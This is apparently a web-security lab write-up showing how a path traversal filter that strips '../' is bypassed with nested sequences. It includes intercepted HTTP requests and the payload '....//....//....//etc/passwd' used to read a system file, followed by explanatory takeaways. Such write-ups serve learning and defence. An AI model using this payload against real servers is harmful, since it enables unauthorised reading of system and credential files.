You might be able to use nested traversal sequences, such as ....// or ....\/. These revert to simple traversal sequences when the inner sequence is stripped.

 This lab contains a path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file. 

## Write-up

1) ) I opened Burp-suite and immediately launched the browser in the **proxy** tab.
2) I pasted the Lab's link and intercepted it .
3) Then i chose a GET request : 

```Request in Proxy
GET /image?filename=13.jpg HTTP/2
Host: 0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net
Cookie: session=fCnHEMGVGwXaQOOsbF49ze5ZLWYQa8xX
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a6e009904051dfa81dad0f1004a00b7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

4) Then I sent that **GET Request** to the repeater for tweaking it a bit. 

```Request in Repeater
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0aa200ae0410dccf82517e5000a700bf.web-security-academy.net
Cookie: session=kGyDZFYNyupEStU3zSAtPqSjt6aNoQmo
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0aa200ae0410dccf82517e5000a700bf.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=2, i
```

5) I successfully exploited the vulnerability and got the contents of /etc/passwd directory.


### **Key Takeaways:**

1. **Path Traversal Vulnerability**:
    - Path traversal vulnerabilities occur when an application improperly handles user-supplied file paths, allowing attackers to access files and directories outside of the intended directory.
2. **Basic Path Traversal Attack**:
    - The standard path traversal attack uses the `../` sequence to navigate up the directory structure and access files, such as sensitive system files (`/etc/passwd`).
3. **Nested Path Traversal**:
    - Attackers can bypass simple filters that remove `../` by using nested traversal sequences like `....//`, which may not be recognized or sanitized by the application.
    - These patterns are a shorthand representation of directory traversal, allowing attackers to "climb" multiple directories by repeating the sequence.
4. **How Nested Traversal Works**:
    - Example: `....//....//....//etc/passwd` bypasses simple sanitization by representing multiple `../` sequences.
    - The application might only remove or block simple `../` patterns but fail to recognize nested variations like `....//` or `....\/`, allowing unauthorized file access.
5. **Why Nested Traversal is Effective**:
    - **Stripping Logic**: Some applications only strip `../` sequences and don't account for variations.
    - **Normalization Issues**: Certain systems might fail to properly resolve or normalize nested path traversal sequences, leaving the server vulnerable to attacks.
    - **URL Encoding**: Attackers may also use URL encoding (e.g., `%2F` for `/` or `%2E` for `.`) in combination with nested sequences to further evade filters.
6. **Exploitation Process**:
    - The attacker modifies the filename parameter in the URL to use nested traversal patterns (e.g., `....//....//....//etc/passwd`).
    - This allows access to sensitive files outside the intended directory, as demonstrated by retrieving the contents of `/etc/passwd`.